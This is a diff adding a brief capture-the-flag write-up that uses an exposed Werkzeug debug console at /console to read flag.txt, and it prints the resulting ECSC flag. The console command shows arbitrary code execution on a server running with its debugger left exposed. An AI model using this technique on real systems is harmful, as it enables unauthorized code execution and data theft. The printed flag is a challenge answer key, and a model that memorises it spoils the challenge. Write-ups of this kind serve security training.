@@ -1,0 +1,7 @@
+see "hint": Brought to you by DON'T PANIC, your friendly Werkzeug powered traceback interpreter.
+access /console
+get flag: 
+[console ready]
+>>> open("flag.txt").read()
+'ECSC{173e83d17759b2fae389dc3156c51544e424743c7e08605994bf3ab4b810b87e}'
+>>> 
